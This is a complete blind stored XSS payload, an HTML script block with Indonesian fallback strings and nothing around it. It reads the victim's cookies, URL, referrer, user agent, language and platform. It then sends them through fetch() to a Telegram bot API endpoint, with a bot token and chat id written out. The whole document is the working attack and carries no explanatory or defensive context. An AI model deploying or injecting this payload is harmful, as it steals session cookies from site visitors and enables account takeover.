<script>
(async () => {
  const cookies = document.cookie || "Tidak ada cookie";
  const url = window.location.href;
  const userAgent = navigator.userAgent;
  const referrer = document.referrer || "Tidak ada referrer";
  const language = navigator.language;
  const platform = navigator.platform;

  const message = `
🚨 Blind Stored XSS Executed
📍 URL: ${url}
🍪 Cookies: ${cookies}
📱 User-Agent: ${userAgent}
↩️ Referrer: ${referrer}
🌐 Language: ${language}
💻 Platform: ${platform}
`;

  await fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: "-1002002449257",
      text: message
    })
  });
})();
</script>
